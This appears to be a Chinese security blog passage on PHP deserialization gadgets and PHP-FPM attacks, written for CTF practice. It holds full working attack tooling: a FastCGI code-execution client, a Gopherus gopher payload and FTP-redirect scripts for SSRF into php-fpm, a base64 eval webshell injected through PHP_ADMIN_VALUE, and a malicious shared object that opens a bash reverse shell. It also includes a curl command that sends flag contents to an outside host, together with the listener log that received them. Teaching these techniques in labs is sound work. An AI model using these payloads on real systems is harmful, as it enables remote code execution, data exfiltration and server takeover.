$dir=new DirectoryIterator(&quot;/&quot;);echo $dir;$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;//也可以与glob://协议配合使用来查找文件$dir=new DirectoryIterator(&quot;glob:///*flag*&quot;);echo $dir;$dir=new FilesystemIterator(&quot;glob:///*flag*&quot;);echo $dir;//GlobIterator无需借助glob协议即可搜索全局文件$dir=new GlobIterator(&quot;/*flag*&quot;);echo $dir;

可读取文件类
SplFileObject 类

SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等
//读取一个文件的一行$context = new SplFileObject(&#x27;/etc/passwd&#x27;);echo $context;//读取多行需要遍历或者使用伪协议$context = new SplFileObject(&#x27;/etc/passwd&#x27;);foreach($context as $f)&#123;    echo($f);&#125;$context = new SplFileObject(&#x27;php://filter/convert.base64-encode/resource=/etc/passwd&#x27;);echo $context;




SoapClient反序列化与ssrf首先需要了解什么是soapsoap，是webService三要素(SOAP、WSDL、UDDI)之一
SOAP: 基于HTTP协议，采用XML格式，用来描述传递信息的格式。WSDL: 用来描述如何访问具体的服务。（相当于说明书）UDDI: 用户自己可以按UDDI标准搭建UDDI服务器，用来管理，分发，查询WebService 。其他用户可以自己注册发布WebService调用。（现在基本废弃）

简单来说就是soap是一种基于http的传输协议，可以发起请求来访问远程服务
php官方手册中对soapclient的解释如下
class SoapClient &#123;/* 属性 */private ?string $uri = null;private ?int $style = null;private ?int $use = null;private ?string $location = null;private bool $trace = false;private ?int $compression = null;private ?resource $sdl = null;private ?resource $typemap = null;private ?resource $httpsocket = null;private ?resource $httpurl = null;private ?string $_login = null;private ?string $_password = null;private bool $_use_digest = false;private ?string $_digest = null;private ?string $_proxy_host = null;private ?int $_proxy_port = null;private ?string $_proxy_login = null;private ?string $_proxy_password = null;private bool $_exceptions = true;private ?string $_encoding = null;private ?array $_classmap = null;private ?int $_features = null;private int $_connection_timeout;private ?resource $_stream_context = null;private ?string $_user_agent = null;private bool $_keep_alive = true;private ?int $_ssl_method = null;private int $_soap_version;private ?int $_use_proxy = null;private array $_cookies = [];private ?array $__default_headers = null;private ?SoapFault $__soap_fault = null;private ?string $__last_request = null;private ?string $__last_response = null;private ?string $__last_request_headers = null;private ?string $__last_response_headers = null;/* 方法 */public __construct(?string $wsdl, array $options = [])public __call(string $name, array $args): mixedpublic __doRequest(    string $request,    string $location,    string $action,    int $version,    bool $oneWay = false): ?stringpublic __getCookies(): arraypublic __getFunctions(): ?arraypublic __getLastRequest(): ?stringpublic __getLastRequestHeaders(): ?stringpublic __getLastResponse(): ?stringpublic __getLastResponseHeaders(): ?stringpublic __getTypes(): ?arraypublic __setCookie(string $name, ?string $value = null): voidpublic __setLocation(?string $location = null): ?stringpublic __setSoapHeaders(SoapHeader|array|null $headers = null): boolpublic __soapCall(    string $name,    array $args,    ?array $options = null,    SoapHeader|array|null $inputHeaders = null,    array &amp;$outputHeaders = null): mixed&#125;

先从手册中看soap的构造方法，可以看到有两个参数，第一个参数$wsdl用来指明是否为wsdl模式，第二个参数$options是一个数组。当在第一个参数中指明了wsdl模式后，第二个参数是可选的，可以没有；当第一个参数设置为非wsdl模式后，第二个参数中必须设置uri和location选项。location就是目标url，uri是soap服务的命令空间

再看__call()方法，当调用类中不存在的方法时就会触发，当触发这个方法后，它就会向location中的目标URL发送一个soap请求
&lt;?php$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;aaa&#x27;,&#x27;location&#x27;=&gt;&#x27;http://20.2.129.79:7777&#x27;));$a-&gt;a();

在vps上监听对应的端口

可以接收到一个post请求，并且SOAPAction的值明显是可控的，那么利用crlf我们就能控制数据包了
比如插入一个cookie
&lt;?php$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;aaa^^Cookie: test=123^^&#x27;,&#x27;location&#x27;=&gt;&#x27;http://20.2.129.79:7777&#x27;));$b = serialize($a);$b = str_replace(&#x27;^^&#x27;,&quot;\r\n&quot;,$b);$c = unserialize($b);$c-&gt;a();?&gt;


但是对于POST数据包，还存在一个问题，即Content-Type的值，默认是text&#x2F;xml，我们修改的SOAPAction在Content-Type的下面，无法控制Content-Type，也就不能控制POST的数据
在header里User-Agent在Content-Type前面，手册中也提到了如何设置User-Agent，我们可以在User-Agent中注入crlf，从而控制Content-Type的值

&lt;?php$post_data = &quot;data=abc&quot;;$a = new SoapClient(null,array(&#x27;user_agent&#x27;=&gt;&#x27;Mozilla/5.0^^Content-Type: application/x-www-form-urlencoded^^Content-Length: &#x27;.strlen($post_data).&#x27;^^^^&#x27;.$post_data,&#x27;uri&#x27;=&gt;&#x27;aaa&#x27;,&#x27;location&#x27;=&gt;&#x27;http://20.2.129.79:7777&#x27;));$b = serialize($a);$b = str_replace(&#x27;^^&#x27;,&quot;\r\n&quot;,$b);$c = unserialize($b);$c-&gt;a();//echo urlencode($b);?&gt;

还需要在结尾设置一个Content-Length，一方面对于post包是必须的，另一方面还能让多余的数据丢弃，不影响我们设定的值

这样就能实现soapclient+crlf组合拳攻击ssrf了


参考文章:由浅入深理解PHP反序列化漏洞[CTF]PHP反序列化总结PHP-反序列化（超细的）
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>php</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>php-fpm攻击总结</title>
    <url>/posts/21a69435/</url>
    <content><![CDATA[PHP-FPM 是 FastCGI 的一个具体实现（协议解析器）
Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给FPM，然后FPM按照fastcgi的协议将TCP流解析成真正的数据
举个例子，用户访问http://127.0.0.1/index.php?a=1&amp;b=2，如果web目录是&#x2F;var&#x2F;www&#x2F;html，那么Nginx会将这个请求变成如下key-value对：
&#123;    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;&#125;

其中SCRIPT_FILENAME的值就是要执行的文件
Nginx解析漏洞该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞
1：由于nginx.conf的错误配置导致nginx把以.php结尾的文件交给fastcgi处理，为此可以构造upload/1.png/1.php（1.png是上传的文件，包含一句话木马）
2：但是fastcgi在处理1.php文件时发现文件并不存在，这时php.ini配置文件中cgi.fix_pathinfo=1发挥作用，这项配置用于修复路径，如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了/1.png，最后将1.png的内容当成php解析
漏洞复现地址：https://github.com/vulhub/vulhub/tree/master/nginx/nginx_parsing_vulnerability
php-fpm未授权导致的任意代码执行PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，伪装成Web服务器中间件和 PHP-FPM 通信，这就造成了 PHP-FPM 的未授权访问漏洞
在此基础上，我们可以设置 PHP-FPM 的两个环境变量：PHP_VALUE和PHP_ADMIN_VALUE。它们的作用就是用来设置PHP配置项的
通过将PHP配置项auto_prepend_file或auto_append_file的值设置成php://input，就能在执行SCRIPT_FILENAME指向的文件时进行包含body内容，从而执行我们自定义的恶意代码
设置包含的条件还需要开启allow_url_include = On(远程文件包含)
综合起来，如下所示
&#123;    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;&#125;



来自phith0n的攻击脚本：
import socketimport randomimport argparseimport sysfrom io import BytesIO# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i):    if PY2:        return force_bytes(chr(i))    else:        return bytes([i])def bord(c):    if isinstance(c, int):        return c    else:        return ord(c)def force_bytes(s):    if isinstance(s, bytes):        return s    else:        return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)def force_text(s):    if issubclass(type(s), str):        return s    if isinstance(s, bytes):        s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;)    else:        s = str(s)    return sclass FastCGIClient:    &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;    # private    __FCGI_VERSION = 1    __FCGI_ROLE_RESPONDER = 1    __FCGI_ROLE_AUTHORIZER = 2    __FCGI_ROLE_FILTER = 3    __FCGI_TYPE_BEGIN = 1    __FCGI_TYPE_ABORT = 2    __FCGI_TYPE_END = 3    __FCGI_TYPE_PARAMS = 4    __FCGI_TYPE_STDIN = 5    __FCGI_TYPE_STDOUT = 6    __FCGI_TYPE_STDERR = 7    __FCGI_TYPE_DATA = 8    __FCGI_TYPE_GETVALUES = 9    __FCGI_TYPE_GETVALUES_RESULT = 10    __FCGI_TYPE_UNKOWNTYPE = 11    __FCGI_HEADER_SIZE = 8    # request state    FCGI_STATE_SEND = 1    FCGI_STATE_ERROR = 2    FCGI_STATE_SUCCESS = 3    def __init__(self, host, port, timeout, keepalive):        self.host = host        self.port = port        self.timeout = timeout        if keepalive:            self.keepalive = 1        else:            self.keepalive = 0        self.sock = None        self.requests = dict()    def __connect(self):        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.settimeout(self.timeout)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # if self.keepalive:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)        # else:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)        try:            self.sock.connect((self.host, int(self.port)))        except socket.error as msg:            self.sock.close()            self.sock = None            print(repr(msg))            return False        return True    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):        length = len(content)        buf = bchr(FastCGIClient.__FCGI_VERSION) \               + bchr(fcgi_type) \               + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \               + bchr(requestid &amp; 0xFF) \               + bchr((length &gt;&gt; 8) &amp; 0xFF) \               + bchr(length &amp; 0xFF) \               + bchr(0) \               + bchr(0) \               + content        return buf    def __encodeNameValueParams(self, name, value):        nLen = len(name)        vLen = len(value)        record = b&#x27;&#x27;        if nLen &lt; 128:            record += bchr(nLen)        else:            record += bchr((nLen &gt;&gt; 24) | 0x80) \                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(nLen &amp; 0xFF)        if vLen &lt; 128:            record += bchr(vLen)        else:            record += bchr((vLen &gt;&gt; 24) | 0x80) \                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(vLen &amp; 0xFF)        return record + name + value    def __decodeFastCGIHeader(self, stream):        header = dict()        header[&#x27;version&#x27;] = bord(stream[0])        header[&#x27;type&#x27;] = bord(stream[1])        header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])        header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])        header[&#x27;paddingLength&#x27;] = bord(stream[6])        header[&#x27;reserved&#x27;] = bord(stream[7])        return header    def __decodeFastCGIRecord(self, buffer):        header = buffer.read(int(self.__FCGI_HEADER_SIZE))        if not header:            return False        else:            record = self.__decodeFastCGIHeader(header)            record[&#x27;content&#x27;] = b&#x27;&#x27;                        if &#x27;contentLength&#x27; in record.keys():                contentLength = int(record[&#x27;contentLength&#x27;])                record[&#x27;content&#x27;] += buffer.read(contentLength)            if &#x27;paddingLength&#x27; in record.keys():                skiped = buffer.read(int(record[&#x27;paddingLength&#x27;]))            return record    def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;):        if not self.__connect():            print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;)            return        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)        self.requests[requestId] = dict()        request = b&quot;&quot;        beginFCGIRecordContent = bchr(0) \                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \                                 + bchr(self.keepalive) \                                 + bchr(0) * 5        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                              beginFCGIRecordContent, requestId)        paramsRecord = b&#x27;&#x27;        if nameValuePairs:            for (name, value) in nameValuePairs.items():                name = force_bytes(name)                value = force_bytes(value)                paramsRecord += self.__encodeNameValueParams(name, value)        if paramsRecord:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId)        if post:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId)        self.sock.send(request)        self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND        self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;        return self.__waitForResponse(requestId)    def __waitForResponse(self, requestId):        data = b&#x27;&#x27;        while True:            buf = self.sock.recv(512)            if not len(buf):                break            data += buf        data = BytesIO(data)        while True:            response = self.__decodeFastCGIRecord(data)            if not response:                break            if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \                    or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR:                if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR:                    self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR                if requestId == int(response[&#x27;requestId&#x27;]):                    self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;]            if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS:                self.requests[requestId]        return self.requests[requestId][&#x27;response&#x27;]    def __repr__(self):        return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ == &#x27;__main__&#x27;:    parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;)    parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;)    parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;)    parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;)    parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int)    args = parser.parse_args()    client = FastCGIClient(args.host, args.port, 3, 0)    params = dict()    documentRoot = &quot;/&quot;    uri = args.file    content = args.code    params = &#123;        &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,        &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;,        &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;),        &#x27;SCRIPT_NAME&#x27;: uri,        &#x27;QUERY_STRING&#x27;: &#x27;&#x27;,        &#x27;REQUEST_URI&#x27;: uri,        &#x27;DOCUMENT_ROOT&#x27;: documentRoot,        &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,        &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,        &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;,        &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,        &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,        &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,        &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;,        &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;,        &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content),        &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,        &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;    &#125;    response = client.request(params, content)    print(force_text(response))

python fpm.py pwn.challenge.ctf.show -p 28230 /var/www/html/index.php -c &quot;&lt;?php system(&#x27;ls /&#x27;); exit();?&gt;&quot;

其中有一点需要注意，FPM在某版本后配置文件添加了security.limit_extensions选项，用于指定解析文件的后缀，并且默认值为.php，所以需要传入一个真实存在的php文件，否则会返回Access denied.或File not found.
不过服务器上通常会存在一些php文件，可以用find / -name &quot;*.php&quot;来查找
bypass-error_log一般的攻击都是通过 auto_prepend_file ， auto_append_file 或者 extension 实现的
if(preg_match(&#x27;/usr|auto|extension|dir/i&#x27;, $data))&#123;    die(&#x27;error&#x27;);&#125;

当部分内容被禁用时，就需要在php的设置中找到可以执行代码，或者包含文件，或者写文件的配置
其中 error_log 这个配置可以保存php的报错信息，并写入到文件中，但是会被实体编码，可以通过 html_errors 设置是否实体编码
&#39;PHP_VALUE&#39;: &#39;html_errors = Off\nerror_log = /var/www/html/1.php&#39;,
但是需要注意需要和有返回报错信息的函数互相配合使用，比如 fsockopen 函数
bypass-内存马&#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include = On\nauto_prepend_file = &quot;data://text/plain;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4=&quot;&#39;
通过FTP攻击php-fpm有的时候php-fpm并没有绑定在0.0.0.0上，而是127.0.0.1或其他地址，这个时候就需要通过ssrf来攻击php-fpm
file_put_contents&lt;?phperror_reporting(0);highlight_file(__FILE__);$file = $_GET[&#x27;file&#x27;];$content = $_GET[&#x27;content&#x27;];file_put_contents($file, $content);


在上面的例子中，一般是可以写入shell的，但是在不能写入文件的情况下呢？
看file_put_contents在php手册中的定义
file_put_contents(PHP 5, PHP 7, PHP 8)file_put_contents — 将数据写入文件file_put_contents(    string $filename,    mixed $data,    int $flags = 0,    ?resource $context = null): int|false和依次调用 fopen()，fwrite() 以及 fclose() 功能一样。

首先调用了fopen()，而fopen可以打开文件或者 URL ，其中包括了ftp://协议
在ftp中，分为主动模式和被动模式。简单来说，主动模式是服务端的20端口去连接客户端的指定端口，被动模式是客户端连接服务端的指定端口。其中的区别就是在哪一端开放端口
既然这样，那我们可以模拟一个被动模式的ftp客户端，指定ip端口为127.0.0.1:9000，这样file_put_contents就会把数据包原封不动的传递给php-fpm，实现ssrf攻击fpm
模拟ftp的python脚本
import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.bind((&#x27;0.0.0.0&#x27;,5566))s.listen(1)conn, addr = s.accept()conn.send(b&#x27;220 welcome\n&#x27;)#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b&#x27;331 Please specify the password.\n&#x27;)#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b&#x27;230 Login successful.\n&#x27;)#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b&#x27;200 Switching to Binary mode.\n&#x27;)#Size /conn.send(b&#x27;550 Could not get the file size.\n&#x27;)#EPSV (1)conn.send(b&#x27;150 ok\n&#x27;)#PASVconn.send(b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;) #STOR / (2)conn.send(b&#x27;150 Permission denied.\n&#x27;)#QUITconn.send(b&#x27;221 Goodbye.\n&#x27;)conn.close()

通过Gopherus构造恶意payload
root@lewiserii:~/Gopherus-master# python2 gopherus.py --exploit fastcgi  ________              .__ /  _____/  ____ ______ |  |__   ___________ __ __  ______/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \ \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;        \/       |__|        \/     \/                 \/                author: $_SpyD3r_$Give one file name which should be surely present in the server (prefer .php file)if you don&#x27;t know press ENTER we have default one:  index.phpTerminal command to run:  curl http://47.99.77.52:5588/?a=`cat /f*`Your gopher link is ready to do SSRF:gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27curl%20http%3A//47.99.77.52%3A5588/%3Fa%3D%60cat%20/f%2A%60%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00-----------Made-by-SpyD3r-----------

payload：
注意ftp协议的格式
/?file=ftp://47.99.77.52:5566/test&amp;content=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27curl%20http%3A//47.99.77.52%3A5588/%3Fa%3D%60cat%20/f%2A%60%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00

监听端口即可
root@dr0n1:~# nc -lvvnp 5588Listening on 0.0.0.0 5588Connection received on 124.223.158.81 33340GET /?a=ctfshowd99cc801-ca48-4632-9cec-c87db8594278 HTTP/1.1Host: 47.99.77.52:5588User-Agent: curl/7.61.1Accept: */*

FTP 仅起到了一个重定向 Payload 内容的作用

file_get_contents&lt;?php$contents = file_get_contents($_GET[&#x27;viewFile&#x27;]);file_put_contents($_GET[&#x27;viewFile&#x27;], $contents);

原理与上面是一样的，只不过将发送payload和重定向都放在了ftp上
第一次连接的时候返回通过Gopherus构造的payload，第二次连接的时候将客户端的连接重定向到 127.0.0.1:9000
使用的时候注意修改payload和第一次返回的ip(第53行)
# -*- coding: utf-8 -*-# @Time    : 2021/1/13 6:56 下午# @Author  : tntaxin# @File    : ftp_redirect.py# @Software:import socketfrom urllib.parse import unquote# 替换gopherus生成的payloadpayload = unquote(&quot;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0C%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1FSCRIPT_FILENAME/usr/share/nginx/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27curl%20http%3A//47.99.77.52%3A5588/%3Fa%3D%60cat%20/f%2A%60%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&quot;)payload = payload.encode(&#x27;utf-8&#x27;)host = &#x27;0.0.0.0&#x27;port = 5566  # 访问端口sk = socket.socket()sk.bind((host, port))sk.listen(5)# ftp被动模式sk2 = socket.socket()sk2.bind((host, 5567))  # 二次访问端口sk2.listen()# 计数器，用于区分是第几次ftp连接count = 1while 1:    conn, address = sk.accept()    conn.send(b&quot;200 \n&quot;)    print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名    if count == 1:        conn.send(b&quot;220 ready\n&quot;)    else:        conn.send(b&quot;200 ready\n&quot;)    print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本    if count == 1:        conn.send(b&quot;215 \n&quot;)    else:        conn.send(b&quot;200 \n&quot;)    print(conn.recv(20))  # SIZE /123\r\n  客户端询问文件/123的大小    if count == 1:        conn.send(b&quot;213 3 \n&quot;)    else:        conn.send(b&quot;300 \n&quot;)    print(conn.recv(20))  # EPSV\r\n&#x27;    conn.send(b&quot;200 \n&quot;)    print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式    if count == 1:        conn.send(b&quot;227 47,99,77,52,0,5567\n&quot;)  # vps第二次访问的ip和端口，与上面对应，注意是逗号分割    else:        conn.send(b&quot;227 127,0,0,1,0,9000\n&quot;)  # 重定向到9000    print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n    if count == 1:        conn.send(b&quot;125 \n&quot;) # 告诉客户端可以开始数据链接了        # 新建一个socket给服务端返回我们的payload        print(&quot;建立连接!&quot;)        conn2, address2 = sk2.accept()        conn2.send(payload)        conn2.close()        print(&quot;断开连接!&quot;)    else:        conn.send(b&quot;150 \n&quot;)        print(conn.recv(20))        exit()    # 第一次连接是下载文件，需要告诉客户端下载已经结束    if count == 1:        conn.send(b&quot;226 \n&quot;)    conn.close()    count += 1

发送payload
?viewFile=ftp://47.99.77.52:5566/test
正常的输出应该如下，有第二次建立连接的过程
b&#x27;USER anonymous\r\n&#x27;b&#x27;TYPE I\r\n&#x27;b&#x27;SIZE /test\r\n&#x27;b&#x27;EPSV\r\n&#x27;b&#x27;PASV\r\n&#x27;b&#x27;RETR /test\r\n&#x27;建立连接!断开连接!b&#x27;USER anonymous\r\n&#x27;b&#x27;TYPE I\r\n&#x27;b&#x27;SIZE /test\r\n&#x27;b&#x27;EPSV\r\n&#x27;b&#x27;PASV\r\n&#x27;b&#x27;STOR /test\r\n&#x27;





攻击unix套接字模式下的php-fpm以上的所有方法都是基于TCP通信方式进行攻击的。但是在php-fpm中还有一种unix domain socket通信方式，它是unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了
一般来说这种通信方式不能进行ssrf，因为没有经过网络协议层
加载so绕过disable_functions
两种通信方式都能使用此方法绕过

在CTF或者渗透测试中经常会遇到目标环境设置了 disable_functions 的情况，但是 PHP_ADMIN_VALUE 不可以设置 disable_functions ，因为这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中
但是我们可以参考 LD_PRELOAD 绕过的方式，上传一个恶意so文件，然后通过 PHP_VALUE 给 php.ini 添加一个 extender 扩展
制作恶意so文件
#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void)&#123;    int i;    for (i = 0; environ[i]; ++i) &#123;            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;                    environ[i][0] = &#x27;\0&#x27;;            &#125;    &#125;    system(&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/IP/PORT &lt;&amp;1&#x27;&quot;);&#125;

编译
gcc -c -fPIC hack.c -o hack &amp;&amp; gcc --share hack -o hack.so
以下是修改过的 https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75，可以生成payload，注意修改 PHP_VALUE 的内容
